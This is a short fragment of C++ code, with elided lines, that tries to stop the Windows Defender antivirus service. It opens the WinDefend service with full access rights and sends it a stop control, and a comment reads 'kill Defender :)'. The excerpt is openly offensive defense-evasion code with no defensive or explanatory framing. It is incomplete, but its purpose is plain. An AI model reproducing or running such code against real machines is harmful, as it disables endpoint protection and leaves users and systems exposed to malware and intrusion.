...
{
	std::cout << "[*] Trying to stop Windows Defender...\n";
	...
	// step 4 - kill Defender :)
	wil::unique_schandle winDefendSvc(OpenServiceW(svcManager.get(), L"WinDefend", SERVICE_ALL_ACCESS));
	if (!winDefendSvc.get())
	{
		Error(GetLastError());
	...
	success = ControlService(winDefendSvc.get(), SERVICE_CONTROL_STOP, &svcStatus);
	if (!success)
	{
		Error(GetLastError());
